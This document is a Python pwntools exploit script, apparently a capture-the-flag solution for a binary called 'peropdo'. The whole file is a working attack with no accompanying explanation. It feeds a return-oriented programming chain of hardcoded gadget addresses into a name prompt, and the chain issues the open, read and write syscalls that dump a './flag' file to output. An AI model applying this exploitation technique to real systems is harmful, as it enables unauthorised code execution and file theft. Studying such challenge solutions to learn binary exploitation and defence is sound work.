from pwn import *


pop_eax = 0x080e3525
pop_ebx = 0x080481c9
pop_ecx = 0x080e5ee1
pop_edx = 0x0806f2fa
int_0x80 = 0x0806fae0

read_bss = 0x80ed140

p = process(["./peropdo"])
elf = ELF("./peropdo")

exp = ''
#exp += p32(200940553)       # rand -> 0x80ecfcc, pop ebp -> esp : 0x80ecfd0
exp += p32(108737191)       #input start : 0x080ecfc0
exp += "\x00" * 8
exp += "./flag" + "\x00" * 86
exp += p32(pop_eax) + p32(5)
exp += p32(pop_ebx) + p32(0x080ecfcc)
exp += p32(pop_ecx) + p32(0)
exp += p32(pop_edx) + p32(0)
exp += p32(int_0x80)

exp += p32(pop_eax) + p32(3)
exp += p32(pop_ebx) + p32(3)
exp += p32(pop_ecx) + p32(read_bss)
exp += p32(pop_edx) + p32(100)
exp += p32(int_0x80)

exp += p32(pop_eax) + p32(4)
exp += p32(pop_ebx) + p32(1)
exp += p32(pop_ecx) + p32(read_bss)
exp += p32(pop_edx) + p32(100)
exp += p32(int_0x80)


p.recvuntil("name?\n")
p.sendline(exp)
print p.recvuntil("roll?\n")
p.sendline("23")
print p.recv()
p.sendline('n')

log.info("Flag : " + p.recvline())
p.close()
